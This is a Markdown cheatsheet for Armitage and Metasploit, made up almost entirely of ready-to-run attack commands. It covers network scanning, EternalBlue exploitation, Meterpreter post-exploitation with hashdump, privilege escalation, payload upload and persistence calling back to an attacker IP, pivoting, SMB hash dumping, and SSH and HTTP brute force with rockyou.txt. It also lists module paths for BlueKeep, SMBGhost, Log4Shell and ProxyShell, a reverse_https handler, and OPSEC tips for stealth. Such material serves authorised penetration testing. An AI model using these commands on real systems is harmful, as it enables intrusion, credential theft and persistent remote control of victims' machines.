# Armitage Cheatsheet

## Quick Reference

### Starting Armitage

```bash
# Start Armitage (auto-starts msfrpcd)
armitage

# Start teamserver for collaboration
teamserver 192.168.1.100 s3cr3t_password

# Connect to teamserver
# Host: 192.168.1.100
# Port: 55553
# User: msf
# Pass: s3cr3t_password
```

### Host Discovery

```bash
# Via GUI: Hosts > Nmap Scan
# Via console (within Armitage):
db_nmap -sV 192.168.1.0/24
db_nmap -A -T4 192.168.1.0/24
db_nmap -p 1-65535 192.168.1.0/24
```

### Exploitation

```bash
# Search for exploits
search type:exploit platform:windows smb
search ms17_010

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set LHOST 192.168.1.100
exploit

# Auto-exploit (Hail Mary)
# Attacks > Hail Mary (use with caution)
```

### Meterpreter Post-Exploitation

```bash
# System information
sysinfo
getuid
getpid
getprivs

# File operations
download C:\Users\target\file.txt
upload /path/to/payload.exe C:\temp\
ls C:\Users
cat C:\Users\target\file.txt

# Privilege escalation
getsystem
hashdump

# Process operations
ps
migrate <pid>
kill <pid>

# Network operations
ipconfig
route
arp
netstat

# Persistence
run persistence -U -i 5 -p <PORT> -r <IP>
```

### Session Management

```bash
# List sessions
sessions

# Interact with session
sessions -i <session_id>

# Background session
background

# Kill session
sessions -k <session_id>

# Session options
sessions -u <session_id>  # Upgrade to Meterpreter
```

### Pivoting

```bash
# Set up route
run autoroute -s 10.0.0.0/24

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# Port forwarding
portfwd add -l 8080 -p 80 -r 10.0.0.1
portfwd delete -l 8080 -p 80 -r 10.0.0.1
portfwd list
```

### Information Gathering

```bash
# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SSH enumeration
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP enumeration
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# Database queries
hosts
services
vulns
creds
```

### Credential Attacks

```bash
# SMB hash dumping
use auxiliary/scanner/smb/smb_hashdump
set RHOSTS 192.168.1.50
run

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.50
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# HTTP basic auth brute force
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.50
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Cortana Scripting

```bash
# Create a Cortana script
on session {
    println("New session from " . $1 . " on " . host_os($1));
    session_system($1);
}

# Run script
# File > Open Script > Select .cns file
```

### Automation

```bash
# Import hosts
# Hosts > Import Hosts > Select file

# Export data
# Hosts > Export Hosts

# Resource files
resource /path/to/commands.rc
```

### Common Modules

```bash
# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue

# BlueKeep
use exploit/windows/rdp/bluekeep_rdp

# SMBGhost
use exploit/windows/smb/cve_2020_0796_smbghost

# Log4Shell
use exploit/multi/http/log4shell_header_injection

# ProxyShell
use exploit/windows/http/exchange_proxyshell_rce
```

### OPSEC Tips

```bash
# Use stealthy scans
db_nmap -sS -T2 192.168.1.0/24

# Limit concurrent exploits
# Don't run Hail Mary on production

# Monitor event log
# View > Event Log

# Use encrypted sessions
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
```
